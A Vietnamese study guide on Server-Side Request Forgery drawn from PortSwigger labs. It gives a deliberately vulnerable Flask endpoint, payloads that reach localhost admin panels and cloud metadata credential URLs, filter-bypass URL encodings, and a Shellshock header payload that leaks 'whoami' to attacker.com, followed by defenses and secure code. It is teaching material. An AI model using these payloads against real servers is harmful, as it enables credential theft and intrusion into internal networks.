# Giả mạo yêu cầu từ phía máy chủ (Server-Side Request Forgery - SSRF)

> **Cre:** [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

---

## 1. Lỗ hổng SSRF là gì?

### 1.1. Định nghĩa
**Server-Side Request Forgery (SSRF)** là một lỗ hổng an ninh web cho phép kẻ tấn công ép máy chủ ứng dụng (Server-side) thực hiện các HTTP request đến một vị trí ngoài ý muốn của nhà phát triển.

Trong một cuộc tấn công SSRF điển hình, kẻ tấn công có thể khiến máy chủ:
*   Tự kết nối lại chính nó (**Loopback / Localhost**).
*   Kết nối đến các dịch vụ nội bộ bên trong mạng LAN của tổ chức (**Intranet / Private Network**).
*   Kết nối đến các dịch vụ siêu dữ liệu của nhà cung cấp điện toán đám mây (**Cloud Metadata Services**).
*   Kết nối đến hệ thống của bên thứ ba bên ngoài để đánh cắp thông tin xác thực.

```
+-----------------------------------------------------------------------------------+
|                            SO SÁNH BẢN CHẤT CSRF VS SSRF                          |
+-----------------------------------------------------------------------------------+
|  Cross-Site Request    | Lừa TRÌNH DUYỆT CỦA NẠN NHÂN (Client) gửi request giả mạo|
|  Forgery (CSRF)        | đến Server ứng dụng.                                     |
+------------------------+----------------------------------------------------------+
|  Server-Side Request   | Lừa CHÍNH MÁY CHỦ ỨNG DỤNG (Server) gửi request giả mạo  |
|  Forgery (SSRF)        | vào các tài nguyên nội bộ đằng sau tường lửa.            |
+-----------------------------------------------------------------------------------+
```

### 1.2. Mức độ tác động (Impact of SSRF)
Một cuộc tấn công SSRF thành công có thể dẫn đến những hậu quả thảm khốc:
*   **Đánh cắp khóa bảo mật đám mây (Cloud Credential Theft):** Truy cập vào API Metadata (như AWS EC2, GCP, Azure) để lấy trọn vẹn Access Key, Secret Key, Token IAM của hạ tầng Cloud.
*   **Quét mạng & Dò tìm dịch vụ nội bộ (Internal Network Reconnaissance):** Quét cổng (Port scan), dò quét các địa chỉ IP private (như `192.168.x.x`, `10.x.x.x`) để lập bản đồ mạng nội bộ.
*   **Vượt qua tường lửa mạng (Firewall / DMZ Bypass):** Các dịch vụ nội bộ (Redis, Elasticsearch, Memcached, Admin API) thường không đặt mật khẩu vì tin tưởng mạng nội bộ an toàn. SSRF biến máy chủ web thành một "bước đệm" (proxy) vượt qua mọi tường lửa để tương tác với các dịch vụ này.
*   **Thực thi mã từ xa (Remote Code Execution - RCE):** Thông qua việc tương tác với các dịch vụ nội bộ không xác thực (như Redis ghi đè SSH key, web console nội bộ hoặc lỗ hổng Shellshock).

---

## 2. Vì sao lỗ hổng SSRF tồn tại?

Lỗ hổng SSRF phát sinh khi ứng dụng web cần **lấy một tài nguyên từ xa** theo yêu cầu của người dùng nhưng **không kiểm tra hoặc làm sạch URL mục tiêu một cách an toàn**.

### Các tính năng thường dễ bị tổn thương SSRF trong thực tế:
1.  **Nhập dữ liệu qua URL (Import by URL):** Tính năng cho phép người dùng nhập link ảnh đại diện từ Facebook/Google, tải file từ link ngoài, xem trước nội dung đường dẫn (Link Preview / Unfurl).
2.  **Webhooks & Tích hợp API:** Cho phép người dùng cấu hình URL để server tự động gửi thông báo (notification/webhook) khi có sự kiện.
3.  **Kiểm tra tính sẵn sàng / Tồn kho (Stock Check / Proxying):** Ứng dụng gửi request đến một API phụ trợ (Back-end API) khác để lấy số lượng hàng tồn kho.
4.  **Tạo PDF từ URL / Chụp ảnh màn hình website (HTML to PDF / Screenshot Service):** Sử dụng Headless Chrome/Puppeteer để render một trang web theo URL người dùng nhập.

#### Đoạn mã Backend mô phỏng bị lỗi (Vulnerable Code - Python/Flask):
```python
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/check-stock', methods=['POST'])
def check_stock():
    # LẤY TRỰC TIẾP URL TỪ DỮ LIỆU NGƯỜI DÙNG GỬI LÊN
    api_url = request.form.get('stockApi')

    # SERVER CẮM ĐẦU GỬI HTTP REQUEST ĐẾN URL ĐÓ MÀ KHÔNG KIỂM TRA
    response = requests.get(api_url)

    # TRẢ TOÀN BỘ KẾT QUẢ VỀ CHO CLIENT
    return jsonify({"status": "success", "data": response.text})
```

---

## 3. Các dạng tấn công SSRF phổ biến & Kỹ thuật khai thác

---

### 3.1. Dạng 1: SSRF nhắm vào chính máy chủ cục bộ (SSRF against the local server)

Trong kiến trúc ứng dụng, nhiều chức năng quản trị chỉ cho phép truy cập nếu request xuất phát từ **chính máy chủ đó (Localhost / 127.0.0.1)**. Khi người dùng ngoài Internet truy cập `/admin`, hệ thống từ chối. Nhưng qua SSRF, chính máy chủ lại là người gửi request đến `/admin`!

*   **Request kiểm tra tồn kho ban đầu:**
    ```http
    POST /product/stock HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 107

    stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
    ```
*   **Kẻ tấn công sửa đổi `stockApi` trỏ về Localhost:**
    ```http
    POST /product/stock HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30

    stockApi=http://127.0.0.1/admin
    ```

#### 🔍 Phân tích chi tiết Payload `stockApi=http://127.0.0.1/admin`:

| Thành phần | Ý nghĩa & Cơ chế hoạt động chi tiết |
| :--- | :--- |
| `http://` | Giao thức truyền tải web thông thường. |
| `127.0.0.1` | **Địa chỉ Loopback IP (Localhost):** Đại diện cho chính chiếc máy chủ đang chạy ứng dụng web. Gói tin không đi ra ngoài mạng mà được định tuyến ngược trở lại máy chủ. |
| `/admin` | Đường dẫn nội bộ của bảng điều khiển quản trị viên. Vì request xuất phát từ chính `127.0.0.1`, hệ thống nhận diện đây là người quản trị trực tiếp trên máy và cho phép mở quyền quản trị mà không cần đăng nhập. |

*   **Hành động tiếp theo:** Kẻ tấn công gọi endpoint xóa tài khoản người dùng:
    ```text
    stockApi=http://127.0.0.1/admin/delete?username=carlos
    ```
*   🧪 **Lab:** [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost) *(Độ khó: APPRENTICE)*

---

### 3.2. Dạng 2: SSRF nhắm vào hệ thống nội bộ khác (SSRF against internal systems)

Máy chủ web đối mặt với Internet thường nằm trong một vùng mạng (DMZ) có kết nối tới mạng nội bộ riêng (Intranet) chứa các máy chủ cơ sở dữ liệu, máy chủ API quản trị (ví dụ dải IP `192.168.0.X` hoặc `10.X.X.X`).

*   **Kỹ thuật khai thác:** Kẻ tấn công dùng **Burp Suite Intruder** quét dải IP nội bộ:
    ```text
    stockApi=http://192.168.0.§1§:8080/admin
    ```
*   **Tiến trình dò quét:** Cho tham số `§1§` chạy từ `1` đến `255`:
    *   Hầu hết các IP không tồn tại máy chủ sẽ trả về lỗi kết nối (`Connection refused` hoặc timeout).
    *   Khi trúng IP của máy chủ quản trị nội bộ (ví dụ: `192.168.0.68`), gói tin phản hồi trả về mã `200 OK` hiển thị giao diện Admin.
*   🧪 **Lab:** [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system) *(Độ khó: APPRENTICE)*

---

### 3.3. Dạng 3: SSRF nhắm vào API Metadata của Cloud (Cloud Instance Metadata API)

Hầu hết các nhà cung cấp đám mây lớn (Amazon AWS, Google Cloud GCP, Microsoft Azure, DigitalOcean) đều cung cấp một dịch vụ HTTP nội bộ tại địa chỉ IP tĩnh **`169.254.169.254`** (gọi là Link-Local Address) để các máy chủ ảo (EC2, VM) truy vấn thông tin cấu hình của chính nó.

Dịch vụ này **mặc định không yêu cầu mật khẩu** nếu truy cập từ bên trong máy ảo:

*   **Payload trên AWS EC2 để trích xuất khóa IAM:**
    ```text
    http://169.254.169.254/latest/meta-data/
    http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
    ```
*   **Kết quả thu được (Dữ liệu bí mật bản rõ):**
    ```json
    {
      "Code" : "Success",
      "LastUpdated" : "2026-11-01T14:00:00Z",
      "Type" : "AWS-HMAC",
      "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
      "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      "Token" : "AQoDYXdzEJr1...EXAMPLETOKEN"
    }
    ```
    *(Kẻ tấn công lấy cặp khóa này cấu hình vào `aws-cli` để chiếm toàn quyền hạ tầng Cloud của công ty).*

*   **Địa chỉ Metadata trên các nền tảng khác:**
    *   **Google Cloud (GCP):** `http://metadata.google.internal/computeMetadata/v1/` (yêu cầu header `Metadata-Flavor: Google`).
    *   **Microsoft Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (yêu cầu header `Metadata: true`).
    *   **DigitalOcean:** `http://169.254.169.254/metadata/v1.json`

---

## 4. Các kỹ thuật Bypass bộ lọc phòng thủ SSRF

Nhiều ứng dụng cố gắng phòng chống SSRF bằng cách sử dụng bộ lọc Blacklist hoặc Whitelist. Dưới đây là các kỹ thuật bypass kinh điển:

---

### 4.1. Bypass bộ lọc Blacklist (Danh sách cấm IP)

Ứng dụng cấm các chuỗi như `127.0.0.1`, `localhost`, `169.254.169.254`.

#### Kỹ thuật 1: Biểu diễn IP dưới các định dạng số khác (Alternative IP Formats)
Hệ điều hành và thư viện socket hỗ trợ nhiều cách viết tương đương của địa chỉ IP `127.0.0.1`:
*   **Dạng rút gọn:** `http://127.1` (Tương đương `127.0.0.1`)
*   **Dạng địa chỉ 0:** `http://0` hoặc `http://0.0.0.0` (Hầu hết các hệ điều hành Linux sẽ tự map `0` về `localhost`)
*   **Dạng số nguyên 32-bit (Decimal / Dword):** `http://2130706433`
    *(Cách tính: $127 \times 256^3 + 0 \times 256^2 + 0 \times 256^1 + 1 = 2130706433$)*
*   **Dạng Hexadecimal:** `http://0x7f000001` hoặc `http://0x7f.0.0.1`
*   **Dạng Bát phân (Octal):** `http://0177.0.0.01`
*   **Dạng IPv6:** `http://[::1]` hoặc `http://[0:0:0:0:0:0:0:1]`

#### Kỹ thuật 2: Sử dụng Domain phân giải về Localhost (DNS Resolution)
Sử dụng các domain công khai nhưng bản ghi DNS trỏ về `127.0.0.1`:
*   Sử dụng dịch vụ DNS động: `http://127.0.0.1.nip.io` hoặc `http://local.sslip.io`
*   Kẻ tấn công tự cấu hình một tên miền của riêng mình (ví dụ: `spoofed.attacker.com`) có bản ghi A trỏ về `127.0.0.1`.

#### Kỹ thuật 3: Bỏ qua kiểm tra bằng URL Encoding kép (Double URL Encoding)
*   Mã hóa ký tự `127.0.0.1` hoặc `/admin` sang `%252f%2561%2564%256d%2569%256e` để vượt qua bộ lọc regex kiểm tra chuỗi.

*   🧪 **Lab:** [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter) *(Độ khó: PRACTITIONER)*

---

### 4.2. Bypass bộ lọc Whitelist (Danh sách trắng Domain)

Ứng dụng chỉ cho phép URL bắt đầu bằng một domain đáng tin cậy: ví dụ `stock.weliketoshop.net`.

#### Kỹ thuật 1: Nhúng thông tin xác thực vào URL (Credentials `@`)
Theo chuẩn URI (RFC 3986), ký tự `@` dùng để phân tách giữa thông tin tài khoản đăng nhập và tên máy chủ:
```text
http://username:password@actual-server.com
```
*   **Payload bypass:**
    ```text
    http://stock.weliketoshop.net@127.0.0.1
    hoặc
    http://127.0.0.1#@stock.weliketoshop.net
    ```
*   *Cơ chế:* Bộ phân tích URL ngây thơ tưởng request gửi tới `stock.weliketoshop.net`, nhưng trình duyệt và thư viện HTTP thực tế lại kết nối tới IP nằm sau ký tự `@` là `127.0.0.1`!

#### Kỹ thuật 2: Lợi dụng ký tự Fragment (`#`)
*   Ký tự `#` bắt đầu phần Fragment của URL và không bao giờ được gửi lên mạng:
    ```text
    http://localhost#@stock.weliketoshop.net
    ```
*   Nếu kết hợp với URL Encoding:
    ```text
    http://localhost%23@stock.weliketoshop.net
    ```

#### Kỹ thuật 3: Lợi dụng phân cấp tên miền (Subdomain Spoofing)
*   Tạo subdomain: `http://stock.weliketoshop.net.attacker.com`
*   Nếu bộ lọc chỉ kiểm tra xem chuỗi có *chứa* hay *bắt đầu bằng* `stock.weliketoshop.net`, nó sẽ bị đánh lừa.

*   🧪 **Lab:** [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter) *(Độ khó: PRACTITIONER)*

---

### 4.3. Bypass qua lỗ hổng Open Redirection (Kỹ thuật mạnh mẽ nhất)

Nếu ứng dụng có bộ lọc Whitelist cực kỳ nghiêm ngặt (chỉ cho phép `https://trusted-domain.com`), nhưng trên chính `trusted-domain.com` lại có một lỗ hổng **Open Redirect** (chuyển hướng tùy ý):

1.  **Lỗ hổng Open Redirect trên trang web:**
    ```text
    https://vulnerable-website.com/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
    ```
2.  **Đưa URL này vào tính năng dính SSRF:**
    *   Tính năng SSRF kiểm tra thấy URL bắt đầu bằng chính domain hợp lệ `vulnerable-website.com` $\rightarrow$ Cho phép gửi request.
    *   Khi gửi request đến URL đó, máy chủ nhận về phản hồi `HTTP 302 Redirect` yêu cầu chuyển hướng đến `http://192.168.0.68/admin`.
    *   Thư viện HTTP của máy chủ tự động "đi theo" (Follow Redirect) và gửi request vào mạng nội bộ!
*   🧪 **Lab:** [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection) *(Độ khó: PRACTITIONER)*

---

## 5. Blind SSRF (SSRF Mù / Tương tác ngoài kênh OAST)

### 5.1. Khái niệm Blind SSRF
Blind SSRF xảy ra khi ứng dụng gửi request đến URL bên ngoài nhưng **hoàn toàn không trả dữ liệu phản hồi (Response Body) về lại cho người dùng**.

### 5.2. Kỹ thuật phát hiện bằng Burp Collaborator (OAST)
Để phát hiện Blind SSRF, kẻ tấn công thay URL bằng một domain do **Burp Collaborator** cung cấp:
```text
Referer: http://YOUR-COLLABORATOR-ID.oastify.com
```
Nếu máy chủ ứng dụng thực hiện truy vấn DNS hoặc gửi HTTP Request đến máy chủ Collaborator, lỗ hổng được xác nhận.

### 5.3. Khai thác Blind SSRF (Khai thác Shellshock nội bộ)
Dù không đọc được response, kẻ tấn công có thể chèn các payload khai thác (như Shellshock `() { :; }; /usr/bin/nslookup $(whoami).attacker.com`) vào các HTTP Headers được máy chủ SSRF chuyển tiếp (như `User-Agent`, `Referer`) để đạt được RCE trên các máy chủ nội bộ.

*   🧪 **Lab 1:** [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection) *(Độ khó: PRACTITIONER)*
*   🧪 **Lab 2:** [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) *(Độ khó: PRACTITIONER)*

---

## 6. Cách phòng chống SSRF triệt để (How to Prevent SSRF)

Phòng chống SSRF đòi hỏi sự kết hợp chặt chẽ giữa **tầng mạng (Network Layer)** và **tầng ứng dụng (Application Layer)**:

---

### 6.1. Phòng thủ ở tầng Mạng (Network-layer Defense)
1.  **Phân vùng mạng (Network Segmentation / DMZ):**
    *   Cô lập các máy chủ web công khai khỏi các hệ thống nhạy cảm nội bộ. Máy chủ web tuyệt đối không được phép định tuyến trực tiếp vào mạng nội bộ quản trị trừ khi có cổng kiểm soát chuyên biệt.
2.  **Tường lửa chặn chiều ra (Strict Egress Firewall):**
    *   Mặc định chặn tất cả các kết nối đi ra (Outbound traffic) từ máy chủ web, chỉ cho phép kết nối đến các cổng và dịch vụ thực sự cần thiết (như port 443 ra ngoài Internet).
3.  **Khóa chặt API Metadata của Cloud:**
    *   Trên AWS: Nâng cấp bắt buộc lên **IMDSv2** (yêu cầu session token qua phương thức `PUT` và header `X-aws-ec2-metadata-token`, triệt tiêu phần lớn các payload SSRF thông thường).
    *   Cấu hình tường lửa iptables chặn truy cập tới IP `169.254.169.254`.

---

### 6.2. Phòng thủ ở tầng Ứng dụng (Application-layer Defense)

1.  **Sử dụng Danh sách trắng nghiêm ngặt (Strict Whitelist):**
    *   Chỉ cho phép kết nối đến các tên miền và IP được định nghĩa cứng từ trước.
2.  **Quy trình xác thực IP an toàn trước khi gửi request (Resolve & Validate):**
    *   *Bước 1:* Phân giải tên miền (DNS Lookup) để lấy ra địa chỉ IP đích.
    *   *Bước 2:* Kiểm tra xem IP đó có thuộc dải mạng cấm hay không (Loại bỏ toàn bộ dải IP Private RFC 1918, Loopback, Link-Local):
        *   `127.0.0.0/8` (Loopback)
        *   `10.0.0.0/8` (Private)
        *   `172.16.0.0/12` (Private)
        *   `192.168.0.0/16` (Private)
        *   `169.254.0.0/16` (Link-Local / Metadata)
        *   `0.0.0.0/8` và `::1`
    *   *Bước 3:* Nếu IP an toàn, gửi request **trực tiếp đến địa chỉ IP đã xác thực đó** kèm theo header `Host` nguyên bản (để chống tấn công DNS Rebinding).
3.  **Vô hiệu hóa việc tự động chuyển hướng (Disable Following Redirects):**
    *   Cấu hình HTTP Client (cURL, Requests, Axios) không tự động đi theo mã `301/302 Redirect` để triệt tiêu hoàn toàn kỹ thuật bypass qua Open Redirection.

#### Đoạn mã an toàn mẫu (Secure Code - Python):
```python
import ipaddress
import socket
import requests
from urllib.parse import urlparse

DISALLOWED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128')
]

def safe_request(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Chỉ chấp nhận HTTP/HTTPS")

    # 1. PHÂN GIẢI DNS LẤY IP
    hostname = parsed.hostname
    ip_str = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip_str)

    # 2. KIỂM TRA IP CÓ THUỘC DẢI BỊ CẤM KHÔNG
    for net in DISALLOWED_NETWORKS:
        if ip_obj in net:
            raise PermissionError("Truy cập vào mạng nội bộ bị từ chối!")

    # 3. GỬI REQUEST VÀ TẮT CHẾ ĐỘ FOLLOW REDIRECT
    return requests.get(url, allow_redirects=False, timeout=5)
```

---

## 7. Danh mục các bài Lab SSRF trên PortSwigger (Lộ trình luyện tập)

| STT | Tên bài Lab | Dạng lỗ hổng | Cấp độ |
| :---: | :--- | :--- | :---: |
| 1 | Basic SSRF against the local server | Tấn công Localhost (127.0.0.1) | Apprentice |
| 2 | Basic SSRF against another back-end system | Dò quét IP mạng nội bộ (192.168.0.X) | Apprentice |
| 3 | SSRF with blacklist-based input filter | Vượt qua Blacklist (127.1, 0, Double Encoding) | Practitioner |
| 4 | SSRF with whitelist-based input filter | Vượt qua Whitelist (Ký tự `@`, `#`) | Practitioner |
| 5 | SSRF with filter bypass via open redirection | Bypass qua lỗ hổng Open Redirection | Practitioner |
| 6 | Blind SSRF with out-of-band detection | Phát hiện Blind SSRF bằng Burp Collaborator | Practitioner |
| 7 | Blind SSRF with Shellshock exploitation | RCE máy chủ nội bộ qua lỗi Shellshock | Practitioner |

---
*Tài liệu học tập và thực hành bảo mật ứng dụng web - Biên soạn dựa trên tiêu chuẩn giáo trình PortSwigger Web Security Academy.*
